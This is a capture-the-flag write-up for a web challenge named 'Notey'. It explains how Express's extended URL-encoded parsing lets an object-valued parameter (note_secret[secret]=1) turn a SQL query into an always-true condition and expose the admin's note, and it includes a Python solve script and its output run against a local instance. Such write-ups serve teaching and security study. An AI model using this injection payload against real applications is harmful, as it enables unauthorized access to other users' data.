---
title: Notey
date: 2024-09-03
author: zacian
tags:
  - Web
draft: false
---

## Description

I created a note sharing website for everyone to talk to themselves secretly. Don't try to access others notes, grass isn't greener :'( )

----

Note : While making this writeup, the challenge infrastucture was already closed, so i had to setup the application manually

## Intuition

Like the other Web challenge [Watermelon](/bhmeaq2024/watermelon/), this challenge too don't have any dedicated frontend to interact with, so we have to send request to backend manually using cURL or BurpSuite

After going through the JavaScript code in `src` folder that was provided to us as public attachment, we can spot different core application functionalities in `index.js` file. Let's go through it one by one

First the login, so let's try to login

```
$ curl -X POST http://127.0.0.1:5000/register \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'username=user&password=password'

....
{"message":"Registration successful"}
```

Now let's login to obtain the session cookie

```
$ curl -v -X POST http://127.0.0.1:5000/login \   
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'username=user&password=password'

......
< Set-Cookie: connect.sid=s%3AWLtkc3mMX8pP2RC5Z39hRb3lNEdN7rZD.LqZ7dU2xaScboDj1ENDv%2FPnmfN%2BZXmuxBTtatly%2F248; Path=/; HttpOnly
....
{"message":"Login successful"} 
```

Now in the next part i had some issues. For some weird reason, i was unable to perform or use other functionalities with the cookie the application provided after loging in, i don't know what i was missing or doing wrong but whatever i did, it says `Authentication required.`, maybe we can't use that cookie to act as a user and add or view note 

Anyways in the following i came up with rather a simple python script with just the `request` module and that did the job and also the script contains the actual solution for the challenge which is to exploit a SQL Injection vulnerability in the `viewNote` input parameters

## Vulnerability

```js
app.get('/viewNote', middleware.auth, (req, res) => {
    const { note_id,note_secret } = req.query;

    if (note_id && note_secret){
        db.getNoteById(note_id, note_secret, (err, notes) => {
            if (err) {
            return res.status(500).json({ error: 'Internal Server Error' });
            }
            return res.json(notes);
        });
    }
    else
    {
        return res.status(400).json({"Error":"Missing required data"});
    }
});
```

First of all we can see, the application only checks for `note_id` and `note_secret` and doesn't check for which user is actually asking using `req.session.username` function

Check [node-js-sql-injection-guide-examples-and-prevention](https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/), at the very end of this article, under the Type Checking section we can see that an attacker passing in a value that gets evaluated as an Object instead of a String value can cause SQLi Vulnerability. for us it would be something like 

in `index.js` i also noticed the following

```js
app.use(bodyParser.urlencoded({
extended: true
}))
```

The extended set to true basically allows user to provide user input as an object or any other valid format

```
note_id=66&note_secret[secret]=1
```

Here `note_secret[secret]` is passed as an object, this results in the following SQL query:

```sql
SELECT * FROM notes WHERE note_id = 66 AND note_secret = `note_secret` = 1
```

The ``note_secret = `note_secret` = 1`` evaluates to TRUE and is a 1=1 attack. BUT WHY `66` ? This is cause in most CTFs say a new created user get's an id of 2 where the id of admin would be 1, similarly when we upload a single note the note_id it shows is 67 and it's a guess that the note_id of admin might be 66, now number is guessable and BruteForceable but not the note_secret and that's where the we implant our injection attack 

## Solution Code

```py
import requests

URL = "http://127.0.0.1:5000"
s = requests.Session()

GET_REQUEST_MAIN = s.get(URL)
print(GET_REQUEST_MAIN.text)

data = {"username":"test1", "password":"12345678"}
POST_REQUEST_REGISTER = s.post(f"{URL}/register", data=data)
print(POST_REQUEST_REGISTER.text)

data = {"username":"test1", "password":"12345678"}
POST_REQUEST_LOGIN = s.post(f"{URL}/login", data=data)
print(POST_REQUEST_LOGIN.text)

data = {"content":"this is content", "note_secret":"12345678"}
POST_REQUEST_ADD_NOTE = s.post(f"{URL}/addNote", data=data)
print(POST_REQUEST_ADD_NOTE.text)

GET_REQUEST_PROFILE = s.get(f"{URL}/profile")
print(GET_REQUEST_PROFILE.text)

GET_REQUEST_VIEW_NOTE = s.get(f"{URL}/viewNote?note_id=66&note_secret[secret]=1")
print(GET_REQUEST_VIEW_NOTE.text)
exit()
```

The output with the flag

```
Welcome
{"message":"Registration successful"}
{"message":"Login successful"}
{"message":"Note added successful"}
[{"note_id":67,"username":"test1","note":"this is content"}]
[{"note_id":66,"username":"admin","note":"BHFlagY{tesst_flag}"}]
```